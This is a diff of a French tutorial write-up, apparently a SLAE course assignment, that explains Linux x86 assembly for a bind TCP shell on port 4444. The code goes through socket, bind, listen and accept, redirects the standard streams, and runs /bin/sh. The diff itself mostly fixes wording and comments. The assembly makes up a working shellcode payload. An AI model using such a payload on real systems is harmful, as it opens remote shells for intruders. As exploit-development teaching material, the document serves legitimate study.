@@ -7,7 +7,7 @@ L'idée ici est dans un premier temps de créer un socket, de le lier à un port
 ## Création d'un socket ##
 
 La principale référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. 
-Nous prenons AF_INET pour le domaine soit la valeur 2, SOCK_STREAM pour le type, valeur 1 et pour le protocol nous laissons la valeur 0.
+Nous prenons AF_INET pour le domain soit la valeur 2, SOCK_STREAM pour le type, valeur 1 et pour le protocol nous laissons la valeur 0.
 
 ```c
 	xor ebx, ebx 		; ebx = 0
@@ -46,12 +46,12 @@ bind(edx, [2,4444,0], 16)
 ```
 La pile ressemble maintenant au schéma ci-dessous:
 
-<a href="../assets/images/stack_1.png"><img src = "../assets/images/stack_1.png" width="700px" height="360px"></a>
+<a href="../assets/images/stack_1.png"><img src = "../assets/images/stack_1.png" width="400px" ></a>
 
 
 ## Ecoute des communications passives ##
 
-eax va contenir le retour de la fonction et dans le cas d'une réussite c'est la valeur 0 qui est attribuée http://man7.org/linux/man-pages/man2/bind.2.html.
+eax va contenir le retour de la fonction et dans le cas d'une réussite c'est la valeur 0 qui sera attribuée http://man7.org/linux/man-pages/man2/bind.2.html.
 
 
 ```c
@@ -59,11 +59,11 @@ eax va contenir le retour de la fonction et dans le cas d'une réussite c'est la
 	; int listen(int sockfd, int backlog);
 	; listen(sockfd, 0);
 
-	mov [ecx+0x4], eax	; we use the stack (ebx is still in the stack and ecx+4 will set to 0)
+	mov [ecx+0x4], eax	; we use the stack (ebx is still in the stack and ecx+4 will be set to 0)
 	mov bl, 0x4		; syscall listen
 	mov al, 0x66		
 	mov ecx, esp
-	int 0x80		; make the syscall socketcall(listen(sockfd,0,0))
+	int 0x80		; make the syscall socketcall(listen(sockfd,0))
 ```
 
 <a href="../assets/images/stack_2.png"><img src = "../assets/images/stack_2.png" width="700px" height="360px"></a>
@@ -72,7 +72,7 @@ eax va contenir le retour de la fonction et dans le cas d'une réussite c'est la
 
 Nous allons pour cette partie, utiliser cette forme  
 accept(sockfd, NULL, NULL).
-ebx    ecx->edx 0 		0
+
 ```c
 	; Accepting the incoming connection
 	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
@@ -109,7 +109,7 @@ _:
 
 nous allons pour cela utiliser execve, int execve(const char *filename, char *const argv[], char *const envp[]) afin de lancer un shell.
 Il sera de la forme execve("/bin/sh", NULL, NULL).
-Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
+Puis enfin, le shell(/bin/sh) est exécuté une fois la connexion établie.
 
 ```c
 	xor ecx,ecx		; ecx = 0
@@ -126,8 +126,9 @@ Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
 ## Code complet ##
 
 ```c
+; Assignement 1 - SLAE
 ; bind tcp shell
-; author: xophidia 
+; author: Alain Menelet 
 
 
 global _start
@@ -135,6 +136,8 @@ global _start
 section .text
 
 _start:
+
+	; Create a socket
 
 	xor ebx, ebx 		; ebx = 0
 	mul ebx			; eax=ebx=edx = 0
@@ -146,6 +149,7 @@ _start:
 	mov al, 0x66		; syscall socketcall
 	int 0x80		; make the syscall socketcall(socket(2,1,0))
 
+	; Bind to a port
 
 	xchg eax, edx		; save sockfd into edx
 	pop ebx			; set ebx = 2 (bind)
@@ -160,11 +164,15 @@ _start:
 	mov al, 0x66
 	int 0x80		; make the syscall  socketcall(bind(sockfd, [2,4444,0], 16))
 
+	; Listen a connection
+
 	mov [ecx+0x4], eax	; we use the stack (ebx is still in the stack and ecx+4 will set to 0)
 	mov bl, 0x4		; syscall listen
 	mov al, 0x66		
 	mov ecx, esp
-	int 0x80		; make the syscall socketcall(listen(sockfd,0,0))
+	int 0x80		; make the syscall socketcall(listen(sockfd,0))
+
+	; Accept
 
 	mov [ecx+0x8], eax	; we use the stack to put the second 0
 	mov bl, 0x5		; syscall accept
@@ -172,6 +180,8 @@ _start:
 	mov ecx, esp
 	int 0x80		; make the syscall socketcall(accept(sockfd,0,0))
 
+
+	; Redirect stdin, stdout and stderr
 
 	xchg ebx, eax		; we save eax
 
@@ -182,6 +192,8 @@ _:
 	int 0x80
 	dec ecx
 	jns _
+
+	; execute the shell /bin/sh
 
 	xor ecx,ecx		; ecx = 0
 	mul ecx			; eax = edx =ecx = 0
